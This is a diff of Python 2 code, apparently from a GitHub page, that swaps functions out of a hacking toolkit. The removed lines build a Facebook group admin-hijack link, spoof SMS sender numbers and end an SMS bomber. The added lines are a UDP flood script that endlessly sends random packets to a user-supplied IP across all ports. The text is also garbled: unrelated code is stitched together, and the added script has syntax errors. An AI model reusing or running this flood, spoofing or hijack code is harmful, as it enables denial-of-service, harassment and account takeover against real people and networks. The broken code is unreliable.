@@ -1,76 +1,49 @@
- #3
-File filter...  
-  53  core/onlen.py 
-@@ -96,8 +96,20 @@ def netcat_rat():
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-def facebookgroup_hijack():
-	print facebookgrouphijack_banner
-	id_group = raw_input("ID Group [ex: 589101351254979]: ")
-	id_user = raw_input("ID User [ex: 100004136748473]: ")
-	while(True):
-		id_group = raw_input("ID Group [ex: 589101351254979]: ")
-		if(id_group == ""):
-			print("ENTER THE GROUP ID PLEASE")
-			continue
-		id_user = raw_input("ID User [ex: 100004136748473]: ")
-		if(id_user == ""):
-			print("ENTER THE USER ID PLEASE")
-			continue
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
 
-		#If the program reaches this line, all info provided is good!
-		break
+os.system("clear")
+os.system("figlet CUUT_ALL")
+print
+print "Author   : NatSo 50"
+print https://github.com/Mahmoud514/Mahmoud.git"
+print "Email     : mhmdfrh514@gmail.com
+print
+ip = raw_input("IP Raoter : ")
+port = input("Port       : ")
 
-
-	time.sleep(1.5)
-	linkjack = 'https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange' % (id_group, id_user)
-	print "[+] LINKJACK >>> https://m.facebook.com/group/add_admin/?group_id=%s&user_id=%s&added&_rdrChange" % (id_group, id_user)
-@@ -131,14 +143,37 @@ def denialofservice_attack():
-
-def sms_spoof_elk():
-	print smsspoofelk_banner
-	usernm = raw_input("Username: ")
-	passwd = raw_input("Password: ")
-	recipient = raw_input("To: ")
-	sender = raw_input("From: ")
-	messagetext = raw_input("Message: ")
-	while(True):
-		usernm = raw_input("Username: ")
-		if(usernm == ""):
-			print("PLEASE ENTER A USERNAME")
-			continue
-		passwd = raw_input("Password: ")
-		if(passwd == ""):
-			print("PLEASE ENTER A PASSWORD")
-			continue
-		recipient = raw_input("To: ")
-		if(recipient == ""):
-			print("PLEASE ENTER THE VICTIM PH. NO.")
-			continue
-		sender = raw_input("From: ")
-		if(sender == ""):
-			print("PLEASE ENTER THE SENDER PH. NO.")
-			continue
-		messagetext = raw_input("Message: ")
-		if(messagetext == ""):
-			print("PLEASE ENTER THE MESSAGE")
-			continue
-
-		#The program will reach here when everything goes fine
-		break
-
-	url = "https://api.46elks.com/a1/SMS"
-	r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
-	print r.json()
-	try:
-		print r.json()
-	except:
-		print ("ERROR OCCURED! This is probably because incorrect username and pass was supplied...")
-	backtomenu_option()
-
-def sms_bomber_jdid():
-@@ -157,4 +192,4 @@ def sms_bomber_jdid():
-		time.sleep(1)
-		count = count + 1
-	print("\033[1;33m[ DONE ] Stopped...\033[0m")
-	backtomenu_option() 
-	backtomenu_option()
+os.system("clear")
+os.system("figlet Starting")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s cut to %s and cut port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
